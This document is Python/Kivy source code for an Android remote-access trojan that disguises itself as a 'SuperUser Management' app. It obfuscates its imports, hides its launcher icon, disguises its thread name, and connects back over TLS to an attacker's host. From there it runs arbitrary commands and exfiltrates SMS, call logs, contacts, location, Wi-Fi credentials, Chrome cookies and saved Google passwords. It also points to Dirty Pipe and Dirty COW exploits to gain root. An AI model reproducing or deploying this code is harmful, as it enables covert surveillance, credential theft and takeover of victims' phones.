from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.uix.switch import Switch
from kivy.graphics import Color, Rectangle
from kivy.clock import Clock

class RootkitApp(App):
    def build(self):
        # Configuration - these will be replaced by the BuildozerPayloadGenerator
        self.LHOST = "{{LHOST}}"
        self.LPORT = "{{LPORT}}"
        self.XOR_KEY = "{{XOR_KEY}}"
        self.HIDE_ICON = "{{HIDE_ICON}}"
        self.WAKELOCK = "{{WAKELOCK}}"
        self.MIN_SLEEP = "{{MIN_SLEEP}}"
        self.MAX_SLEEP = "{{MAX_SLEEP}}"
        
        # Fallbacks if replacement fails
        if "{{"+"LHOST"+"}}" == self.LHOST: self.LHOST = "127.0.0.1"
        if "{{"+"LPORT"+"}}" == self.LPORT: self.LPORT = "5000"
        if "{{"+"XOR_KEY"+"}}" == self.XOR_KEY: self.XOR_KEY = "SuperSploitKey"
        if "{{"+"HIDE_ICON"+"}}" == self.HIDE_ICON: self.HIDE_ICON = "true"
        if "{{"+"WAKELOCK"+"}}" == self.WAKELOCK: self.WAKELOCK = "false"
        if "{{"+"MIN_SLEEP"+"}}" == self.MIN_SLEEP: self.MIN_SLEEP = "10"
        if "{{"+"MAX_SLEEP"+"}}" == self.MAX_SLEEP: self.MAX_SLEEP = "30"

        # Base64 Helper for dynamic import resolution
        def _i(b, f=None):
            m = base64.b64decode(b).decode('utf-8')
            return __import__(m, fromlist=[f] if f else [])

        # Obfuscated dynamic imports
        self._o = _i(b'b3M=')  # os
        self._s = _i(b'c3VicHJvY2Vzcw==')  # subprocess
        self._sh = _i(b'c2hsZXg=')  # shlex
        self._io = _i(b'aW8=')  # io
        self._sy = _i(b'c3lz')  # sys
        self._so = _i(b'c29ja2V0')  # socket
        self._gp = _i(b'Z2V0cGFzcw==')  # getpass
        self._st = _i(b'c3RydWN0')  # struct
        self._tm = _i(b'dGltZQ==')  # time
        self._rd = _i(b'cmFuZG9t')  # random
        self._sl = _i(b'c3Ns')    # ssl
        self._ct = _i(b'Y3R5cGVz') # ctypes

        # Root Context State
        self.is_root = False

        # Thread Renaming (Stealth)
        try:
            libc = self._ct.CDLL('libc.so')
            libc.prctl(15, b'sys_watchdog', 0, 0, 0)
        except: pass

        # OPSEC: Hide app icon from the launcher after 15 seconds
        if self.HIDE_ICON.lower() in ["true", "1", "yes", "y"]:
            Clock.schedule_once(self.hide_launcher_icon, 15)

        # Start C2 Loop
        threading.Thread(target=self.rootkit_loop, daemon=True).start()
        
        # --- UI IMPLEMENTATION (SuperUser Mock) ---
        main_layout = BoxLayout(orientation='vertical')
        with main_layout.canvas.before:
            Color(0.93, 0.93, 0.93, 1) # #EEEEEE
            self.rect = Rectangle(size=(2000, 4000), pos=main_layout.pos)

        # Header
        header = Label(
            text="SuperUser Management",
            size_hint_y=None,
            height='60dp',
            font_size='20sp',
            bold=True,
            color=(1, 1, 1, 1)
        )
        with header.canvas.before:
            Color(0.25, 0.32, 0.71, 1) # #3F51B5
            Rectangle(size=(2000, 2000), pos=(0, 0)) # Placeholder pos, layout will fix
        
        # Status
        status_box = BoxLayout(orientation='vertical', size_hint_y=None, height='120dp', padding='20dp')
        status_label = Label(
            text="Root Status: Granted\nSU Binary: v2.82\nSELinux: Enforcing\nActive Apps: 4",
            color=(0.3, 0.69, 0.31, 1), # #4CAF50
            font_size='16sp',
            bold=True,
            halign='left',
            valign='middle'
        )
        status_label.bind(size=status_label.setter('text_size'))
        status_box.add_widget(status_label)

        # App List
        scroll = ScrollView()
        app_list = BoxLayout(orientation='vertical', size_hint_y=None, padding='10dp')
        app_list.bind(minimum_height=app_list.setter('height'))

        fake_apps = ["Terminal Emulator", "Titanium Backup", "Root Explorer", "AdAway"]
        for app_name in fake_apps:
            row = BoxLayout(orientation='horizontal', size_hint_y=None, height='60dp', padding='10dp')
            row_label = Label(text=app_name, color=(0, 0, 0, 1), font_size='18sp', halign='left', valign='middle')
            row_label.bind(size=row_label.setter('text_size'))
            row_switch = Switch(active=True)
            row.add_widget(row_label)
            row.add_widget(row_switch)
            app_list.add_widget(row)
            
            # Divider
            divider = Widget(size_hint_y=None, height='1dp')
            with divider.canvas:
                Color(0.86, 0.86, 0.86, 1)
                Rectangle(size=(2000, 1), pos=divider.pos)
            app_list.add_widget(divider)

        scroll.add_widget(app_list)
        main_layout.add_widget(header)
        main_layout.add_widget(status_box)
        main_layout.add_widget(scroll)

        # Trigger SU request via standard popen to prompt Magisk
        try: self._o.popen("su -c id")
        except: pass

        return main_layout

    def hide_launcher_icon(self, dt):
        try:
            from jnius import autoclass
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            pm = activity.getPackageManager()
            component = autoclass('android.content.ComponentName')(
                activity.getPackageName(), 
                "org.kivy.android.PythonActivity"
            )
            pm.setComponentEnabledSetting(
                component,
                autoclass('android.content.pm.PackageManager').COMPONENT_ENABLED_STATE_DISABLED,
                autoclass('android.content.pm.PackageManager').DONT_KILL_APP
            )
        except: pass

    def check_su(self):
        if self._o.getuid() == 0: return True
        try:
            # Attempt a test su command
            proc = self._s.run(['su', '-c', 'id'], capture_output=True, text=True, timeout=5)
            if 'uid=0' in proc.stdout:
                return True
        except: pass
        return False

    def _xor(self, data, key):
        if isinstance(data, str): data = data.encode('utf-8', errors='ignore')
        return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])

    def _send(self, sock, data):
        try:
            if data is None: data = " "
            if isinstance(data, bytes): data = data.decode('utf-8', errors='ignore')
            enc = base64.b64encode(self._xor(data, self.XOR_KEY))
            sock.sendall(self._st.pack('>I', len(enc)) + enc)
        except Exception: pass

    def _recv(self, sock):
        try:
            def _r(n):
                d = bytearray()
                while len(d) < n:
                    p = sock.recv(n - len(d))
                    if not p: return None
                    d.extend(p)
                return bytes(d)
            raw_l = _r(4)
            if not raw_l: return None
            l = self._st.unpack('>I', raw_l)[0]
            if l == 0: return b""
            enc = _r(l)
            if not enc: return None
            dec = base64.b64decode(enc)
            return self._xor(dec, self.XOR_KEY)
        except Exception: return None

    def run_with_output(self, sock, cmd):
        """Unified command execution with automatic root elevation."""
        try:
            env = self._o.environ.copy()
            if 'LD_LIBRARY_PATH' in env: del env['LD_LIBRARY_PATH']
            
            # Wrap in su -c if root is available and not already root
            if self.is_root and self._o.getuid() != 0 and not cmd.startswith("su -c"):
                full_cmd = f"su -c '{cmd}'"
            else:
                full_cmd = cmd

            proc = self._s.run(full_cmd, shell=True, capture_output=True, text=True, timeout=30, env=env)
            output = (proc.stdout + proc.stderr) or " \n"
            self._send(sock, output)
        except Exception as e:
            self._send(sock, f"Error: {e}\n")

    def auto_root(self):
        """Attempts to gain silent root via LPE or SU detection."""
        if self.check_su():
            self.is_root = True
            return "[+] Root access granted via SU binary (Magisk/SuperUser).\n"

        try:
            release = self._o.uname().release
            if release.startswith('5.'):
                minor = int(release.split('.')[1])
                if 8 <= minor <= 16: return "GET_EXPLOIT exploits/android/cve_2022_0847_dirtypipe.py\n"
            if any(v in release for v in ["3.10", "3.4", "3.18"]) or release.startswith('4.'):
                return "GET_EXPLOIT exploits/android/cve_2016_5195_dirtycow.py\n"
                
            return f"[-] auto_root failed: No viable LPE exploit for kernel {release}.\n"
        except Exception as e:
            return f"[-] auto_root error: {e}\n"

    def rootkit_loop(self):
        while True:
            try:
                raw_s = self._so.socket(self._so.AF_INET, self._so.SOCK_STREAM)
                ctx = self._sl.SSLContext(self._sl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = self._sl.CERT_NONE
                s = ctx.wrap_socket(raw_s, server_hostname=self.LHOST)
                s.connect((self.LHOST, int(self.LPORT)))
                
                # Auto-detect root on check-in
                self.is_root = self.check_su()
                banner = f"Kivy Rootkit Session: {self._o.uname().node} (ROOT: {'SU' if self.is_root else 'NO'})\n"
                self._send(s, banner)

                if self.is_root and self.WAKELOCK.lower() in ["true", "1", "yes", "y"]:
                    try:
                        with open('/sys/power/wake_lock', 'w') as f: f.write('sys_watchdog')
                    except: pass

                while True:
                    data = self._recv(s)
                    if data is None: break
                    if data == b"": continue 

                    cmd = data.decode('utf-8', errors='ignore').strip()
                    if not cmd: continue
                    if cmd.lower() == 'exit':
                        s.close()
                        return

                    if cmd == 'auto_root':
                        self._send(s, self.auto_root())
                        continue

                    # --- EXFILTRATION COMMANDS ---
                    if cmd == 'dump_sms':
                        self.run_with_output(s, "content query --uri content://sms")
                    elif cmd == 'dump_calls':
                        self.run_with_output(s, "content query --uri content://call_log/calls")
                    elif cmd == 'dump_contacts':
                        self.run_with_output(s, "content query --uri content://contacts/phones")
                    elif cmd == 'dump_calendar':
                        self.run_with_output(s, "content query --uri content://com.android.calendar/events")
                    elif cmd == 'get_accounts':
                        self.run_with_output(s, "dumpsys account")
                    elif cmd == 'list_apps':
                        self.run_with_output(s, "pm list packages -f")
                    elif cmd == 'get_location':
                        self.run_with_output(s, "dumpsys location | grep -E \"last location|Last Known Locations:\" -A 10")
                    elif cmd == 'dump_wifi':
                        self.run_with_output(s, "cat /data/misc/wifi/WifiConfigStore.xml /data/misc/wifi/wpa_supplicant.conf /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml 2>/dev/null")
                    elif cmd == 'dump_chrome':
                        self.run_with_output(s, "cat \"/data/data/com.android.chrome/app_chrome/Default/Cookies\" \"/data/data/com.android.chrome/app_chrome/Default/Login Data\" 2>/dev/null")
                    elif cmd == 'dump_google_passwords':
                        self.run_with_output(s, "cat /data/data/com.google.android.gms/databases/autofill.db /data/data/com.google.android.gms/databases/credential_manager.db /data/data/com.google.android.gms/databases/password_store.db /data/system_ce/0/accounts_ce.db 2>/dev/null")
                    elif cmd == 'find_cookies':
                        self.run_with_output(s, "find /data/data/ -name \"Cookies\" -o -name \"*cookies.db*\" 2>/dev/null")
                    elif cmd == 'find_passwords':
                        self.run_with_output(s, "find /data/data/ -name \"Login Data\" -o -name \"*password*\" -o -name \"*credential*\" 2>/dev/null")
                    
                    elif cmd.startswith('exec(') or (cmd.endswith(')') and '(' in cmd and ' ' not in cmd.split('(')[0]):
                        try:
                            old_stdout = self._sy.stdout
                            self._sy.stdout = self._io.StringIO()
                            exec(compile(cmd, '<string>', 'exec'), globals())
                            output = self._sy.stdout.getvalue()
                            self._sy.stdout = old_stdout
                            self._send(s, output if output else " \n")
                        except Exception as e: self._send(s, f"[-] Python Error: {e}\n")
                    
                    elif cmd.startswith('cd '):
                        try:
                            self._o.chdir(cmd[3:].strip())
                            self._send(s, b"\n")
                        except Exception as e: self._send(s, f"{e}\n")
                    
                    elif cmd == 'pwd': self._send(s, self._o.getcwd() + "\n")
                    
                    elif cmd.startswith('ls'):
                        try:
                            target_dir = cmd[3:].strip() or '.'
                            files = self._o.listdir(target_dir)
                            self._send(s, '\n'.join(files) + "\n" if files else ' \n')
                        except Exception as e: self._send(s, f"{e}\n")
                    
                    elif cmd.startswith('cat '):
                        try:
                            with open(cmd[4:].strip(), 'r', encoding='utf-8', errors='ignore') as f:
                                out = f.read()
                                self._send(s, out if out else ' \n')
                        except Exception as e: self._send(s, f"{e}\n")
                    
                    elif cmd == 'whoami':
                        try: self._send(s, (self._o.environ.get('USER') or self._gp.getuser()) + "\n")
                        except Exception: self._send(s, b"unknown\n")
                    
                    elif cmd == 'ps':
                        try:
                            out = "PID\tNAME\n"
                            for pid in self._o.listdir('/proc'):
                                if pid.isdigit():
                                    try:
                                        with open(f"/proc/{pid}/comm", 'r') as f: out += f"{pid}\t{f.read().strip()}\n"
                                    except: pass
                            self._send(s, out if out else ' \n')
                        except Exception as e: self._send(s, f"{e}\n")
                    
                    else: self.run_with_output(s, cmd)

            except Exception:
                try: sleep_time = getattr(self._rd, 'randint')(int(self.MIN_SLEEP), int(self.MAX_SLEEP))
                except: sleep_time = getattr(self._rd, 'randint')(10, 30)
                time.sleep(sleep_time)

if __name__ == '__main__':
    RootkitApp().run()
